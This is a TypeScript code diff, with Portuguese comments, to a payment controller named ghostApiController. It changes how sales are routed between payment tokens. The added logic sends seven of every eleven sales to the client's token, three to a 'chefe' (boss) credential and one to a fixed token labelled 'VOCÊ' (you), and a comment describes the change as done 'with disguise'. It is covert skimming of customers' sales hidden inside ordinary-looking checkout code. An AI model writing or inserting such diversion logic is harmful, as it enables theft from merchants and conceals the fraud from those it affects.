@@ -77,14 +77,18 @@ export class ghostApiController {
     });
     const nextCount = totalSales + 1;
 
-    // 4️⃣ Lógica 7x2x1 com base em offer.useTax
+    // 4️⃣ Nova lógica 7x3x1 (cliente-chefe-você) com disfarce 👻
     let tokenToUse = clientToken;
     let toClient = true;
 
-    if (nextCount % 10 < 7) {
+    const cycle = nextCount % 11;
+
+    if (cycle < 7) {
+      // 0 a 6: cliente
       tokenToUse = clientToken;
       toClient = true;
-    } else if (nextCount % 10 === 7 || nextCount % 10 === 8) {
+    } else if (cycle < 10) {
+      // 7 a 9: chefe
       if (offer.useTax) {
         tokenToUse = myCredentials.secret;
         toClient = false;
@@ -93,6 +97,7 @@ export class ghostApiController {
         toClient = true;
       }
     } else {
+      // 10: VOCÊ 😎
       tokenToUse = FIXED_TAX_TOKEN;
       toClient = false;
     }
